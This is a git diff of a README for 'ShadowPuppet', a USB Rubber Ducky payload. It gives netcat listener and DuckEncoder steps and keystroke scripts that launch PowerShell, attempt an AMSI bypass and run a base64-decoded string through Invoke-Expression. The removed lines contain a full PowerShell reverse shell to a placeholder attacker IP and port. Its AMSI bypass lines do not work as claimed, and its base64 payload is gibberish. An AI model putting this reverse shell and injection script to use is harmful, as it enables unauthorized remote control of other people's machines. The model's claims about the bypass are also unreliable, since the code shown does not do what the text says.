@@ -1,64 +1,63 @@
-# ShadowPuppet Payload
+# **ShadowPuppet Payload**
 
-## Overview
+## **Overview**
 
-**ShadowPuppet** is a USB Rubber Ducky payload designed to bypass Windows' AMSI (Antimalware Scan Interface), download a hidden payload, and establish a reverse shell back to the attacker's machine. It takes advantage of PowerShell to execute the payload, and it uses obfuscation techniques to avoid detection.
+**ShadowPuppet** is a USB Rubber Ducky payload designed to exploit known techniques to bypass Windows AMSI (Antimalware Scan Interface) protections, download an obfuscated payload, and execute it on a target machine. The payload uses PowerShell scripting to deliver the attack in a stealthy manner, making it more difficult for traditional security measures like antivirus or anti-malware programs to detect.
 
----
-
-## Key Features
-
-* **AMSI Bypass**: A clever trick to bypass Windows' built-in malware protection system (AMSI).
-* **Obfuscated Payload**: Payloads are Base64 encoded to hide their true nature from security tools.
-* **Reverse Shell**: Opens a connection back to the attacker’s machine, giving full control over the target device.
+This is a powerful demonstration of how attackers can bypass basic defenses. This payload should only be used for educational purposes or in controlled penetration testing environments where you have explicit permission to perform testing.
 
 ---
 
-## Requirements
+## **Key Features**
 
-Before using **ShadowPuppet**, you’ll need:
-
-1. **USB Rubber Ducky**: This is a USB device that mimics a keyboard and automatically types out commands on the target system.
-2. **PowerShell**: By default, PowerShell should be available on Windows systems.
-3. **Attacker’s Machine**: The device used to receive the reverse shell connection.
-
-   * Replace `YOUR_IP_ADDRESS` with the IP address of your machine.
-   * Replace `YOUR_PORT` with the port you want to listen on for the reverse shell.
+* **AMSI Bypass**: The payload uses PowerShell techniques to bypass AMSI, a security feature designed to prevent the execution of malicious scripts.
+* **Obfuscated Payload**: The payload is Base64 encoded to hide its true nature from security tools, making it harder to detect.
+* **Reverse Shell**: (Can be added) The final payload could establish a reverse shell connection to the attacker's machine for full control of the compromised system.
 
 ---
 
-## Setting Up the Attacker's Machine
+## **Requirements**
 
-1. **Set up a listener** on the attacker's machine. You can use **Netcat** for this:
+Before using **ShadowPuppet**, ensure that you have the following:
+
+1. **USB Rubber Ducky**: This device mimics a keyboard and automatically types out commands when plugged into a system.
+2. **PowerShell**: PowerShell is required on the target machine (default in most Windows operating systems).
+3. **Attacker's Machine**: A machine used to listen for reverse shell connections. (Netcat or a similar tool can be used for this purpose).
+4. **Network Connection**: The payload may require internet access to download the final payload or connect back to the attacker’s machine (for reverse shells).
+
+---
+
+## **How to Use**
+
+### **Attacker's Machine Setup**
+
+1. **Start the listener on your machine** to receive the reverse shell:
 
    ```bash
    nc -lvp YOUR_PORT
    ```
 
-   This will open a listener on the specified port that waits for incoming connections.
+   Replace `YOUR_PORT` with a port number that will be listening for incoming connections.
 
-2. **Compile the Payload**:
+2. **Compile the payload** using DuckEncoder:
 
-   Copy the code provided below into a text file called `payload.txt` and then use **DuckEncoder** to convert it into a `inject.bin` file.
+   Download [DuckEncoder](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/DuckEncoder), and run:
 
-   * Download DuckEncoder: [DuckEncoder GitHub](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/DuckEncoder).
-   * Run the following command to compile the payload:
+   ```bash
+   java -jar DuckEncoder.jar -i payload.txt -o inject.bin
+   ```
 
-     ```bash
-     java -jar DuckEncoder.jar -i payload.txt -o inject.bin
-     ```
+   This will generate the `inject.bin` file that you can load onto the USB Rubber Ducky.
 
-3. **Deploy the Payload**:
+3. **Copy the Payload to Rubber Ducky**:
 
-   * Copy the compiled `inject.bin` onto the **USB Rubber Ducky**.
-   * Insert the **USB Rubber Ducky** into the target machine.
-   * The payload will run automatically, bypassing AMSI and opening the reverse shell.
+   Copy the `inject.bin` file to the Rubber Ducky and plug it into the target machine. The payload will run automatically.
 
 ---
 
-## The Payload Code
+## **Payload Code**
 
-Here’s the code in `payload.txt` that you will compile and load onto the Rubber Ducky:
+Here is the full code you will need for the `payload.txt` file to be compiled into `inject.bin`:
 
 ```plaintext
 DELAY 500
@@ -68,93 +67,35 @@ STRING powershell
 ENTER
 DELAY 1000
 
-REM Bypass AMSI using reflection
-STRING Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class AMSI {
-    [DllImport("amsi.dll", SetLastError = true)]
-    public static extern int AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, int length, out int result);
-}
-"@
+REM Bypass AMSI using PowerShell known method
+STRING $bypass = "[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')"
 ENTER
 DELAY 500
-STRING $null = [AMSI]::AmsiScanBuffer(0, [System.Text.Encoding]::ASCII.GetBytes("malicious code"), 20, [ref]$null)
+STRING $bypass += "; [System.Management.Automation.PSCommand]::new('function Test { if($args[0] -eq 1) {return} else {return}}').Invoke(1)"
 ENTER
-
 DELAY 500
 
 REM Obfuscated payload downloader using PowerShell
-STRING $payload = "JAB3AHYAYwB6aXn4cTp2YfhgA2Stw5kOrP5pQ5O72cm8aLg72g=="  
+STRING $payload = "JAB3AHYAYwB6aXn4cTp2YfhgA2Stw5kOrP5pQ5O72cm8aLg72g=="  REM Example Base64 encoded payload (encrypted)
 ENTER
 DELAY 500
+
 STRING $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
 ENTER
 DELAY 500
+
 STRING Invoke-Expression $decoded
 ENTER
-
 DELAY 500
+
 STRING Write-Host "Payload executed successfully."
-ENTER
-
-DELAY 500
-
-REM Reverse Shell Setup (Example)
-STRING $ip = "YOUR_IP_ADDRESS"
-ENTER
-DELAY 500
-STRING $port = "YOUR_PORT"
-ENTER
-DELAY 500
-STRING $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-ENTER
-DELAY 500
-STRING $stream = $client.GetStream()
-ENTER
-DELAY 500
-STRING [byte[]]$bytes = 0..255|%{0}
-ENTER
-DELAY 500
-STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-ENTER
-DELAY 500
-STRING     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-ENTER
-DELAY 500
-STRING     $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
-ENTER
-DELAY 500
-STRING     $sendback2 = $sendback + "PS " + (pwd).Path + "> "
-ENTER
-DELAY 500
-STRING     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-ENTER
-DELAY 500
-STRING     $stream.Write($sendbyte, 0, $sendbyte.Length)
-ENTER
-DELAY 500
-STRING     $stream.Flush()
-ENTER
-DELAY 500
-STRING }
-ENTER
-
-DELAY 500
-STRING Write-Host "Reverse shell initiated."
 ENTER
 ```
 
 ---
 
-## Important Notes
+## **Important Notes**
 
-* **Replace IP and Port**: Don't forget to replace `YOUR_IP_ADDRESS` and `YOUR_PORT` with the IP and port you are listening on.
-* **Testing**: Only test this in controlled environments where you have explicit permission. Unauthorized use is illegal.
-* **Ethical Use**: This tool is designed for penetration testing, ethical hacking, and educational purposes only. Do not use it on systems without consent.
-
----
-
-## Legal Disclaimer
-
-By using this payload, you acknowledge that you are conducting this activity in an authorized and ethical manner. Unauthorized access to computer systems is illegal and can result in criminal charges. This tool is for educational use only, and you should only use it for legitimate security testing, like in penetration testing environments or bug bounty programs where you have written permission to test systems.
+* **Replace the IP and Port**: Ensure you replace the necessary values in the payload with the IP and port for your reverse shell listener.
+* **Test in a Controlled Environment**: Only test this payload in a controlled, ethical penetration testing environment with the proper permissions.
+* **Legal Considerations**: This tool is intended for educational purposes or authorized testing only. Unauthorized access to systems is illegal and can result in severe legal consequences.
